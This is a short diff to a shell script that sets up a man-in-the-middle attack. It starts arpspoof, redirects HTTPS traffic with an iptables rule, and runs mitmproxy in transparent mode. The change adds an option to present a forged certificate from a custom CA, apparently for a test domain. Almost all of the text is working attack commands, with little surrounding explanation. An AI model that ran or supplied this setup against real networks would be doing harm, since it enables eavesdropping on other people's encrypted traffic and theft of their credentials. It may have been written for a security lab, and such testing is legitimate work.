@@ -12,8 +12,13 @@ echo "Starting arpspoof"
 echo "Setting iptables rule"
 iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
 
-echo "Starting mitmproxy"
-mitmproxy -m transparent -s proxy.py --ssl-insecure
+if [ "$1" == "--custom-ca" ]; then
+        echo "Starting mitmproxy with a certificate issued by the custom CA"
+        mitmproxy -m transparent -s proxy.py --ssl-insecure --certs www.mitmtest.com=fake-cert.pem
+else
+        echo "Starting mitmproxy with a self-signed certificate"
+        mitmproxy -m transparent -s proxy.py --ssl-insecure
+fi
 
 echo "Cleaning up"
 kill -s SIGINT $(pidof arpspoof)
